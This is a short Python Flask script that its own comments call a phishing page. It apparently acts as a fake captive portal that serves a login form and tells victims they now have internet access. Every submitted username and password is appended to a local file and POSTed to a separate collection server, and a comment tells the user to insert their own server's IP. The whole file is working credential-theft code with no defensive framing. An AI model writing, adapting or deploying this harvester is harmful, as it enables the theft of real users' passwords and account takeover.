from flask import Flask, render_template, request
import requests


# Flask app setup
app = Flask(__name__)


# Route for the phishing page
@app.route("/", methods=["GET", "POST"])
def phishing_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Log locally
        with open("captured_credentials.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")

        # Send to your server
        try:
            response = requests.post(
                "http://192.168.15.107:5001/capture",  # !!!!Replace with your server's IP!!!!
                data={"username": username, "password": password}
            )
            print(f"Data sent to server: {response.status_code}")
        except Exception as e:
            print(f"Error sending data: {e}")

        return "<h1>Thank you for logging in! Enjoy your internet access.</h1>"

    return render_template("phishingPage.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
